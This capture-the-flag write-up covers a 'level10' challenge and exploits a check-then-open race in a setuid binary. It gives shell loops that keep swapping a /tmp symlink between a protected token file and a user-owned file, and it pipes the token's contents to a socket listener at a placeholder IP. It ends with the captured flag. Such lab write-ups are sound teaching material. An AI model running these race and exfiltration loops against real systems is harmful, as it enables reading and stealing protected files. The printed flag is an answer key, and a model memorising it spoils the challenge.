In the /home, there is:
	- level10 (binary executable)
	- token (txt file containing the flag)

We do not have the rights to read token. The executable ask for a file to send online, but first check if we have rights over it.

nm level10:

         U access@@GLIBC_2.0
0804a064 b completed.6159
         U connect@@GLIBC_2.0
0804a044 W data_start
0804a068 b dtor_idx.6161
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
080486b0 t frame_dummy
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
080486d4 T main
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
0804a060 B stdout@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0

man access:

Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole,  because  the  user
       might  exploit  the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the
       example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

More help with the vulnerability: https://security.stackexchange.com/a/42661

We write a file in /tmp containing a random string. The point is that we have rights on *this* file.

We create an infinite loop that generate a symbolic link on the token, and then on our file. This will allow the spoofing of access.

while true; do ln -sb ~/token /tmp/tok; ln -sb /tmp/test /tmp/tok; done &

Then, we use this command:

while true; do ./level10 /tmp/tok <ip> | grep -v "You don't have access" | grep -v "Unable to connect to host" ; done &

Finally, we create a socket server to get the data. The result is :
	woupa2yuojeeaaed06riuj63c
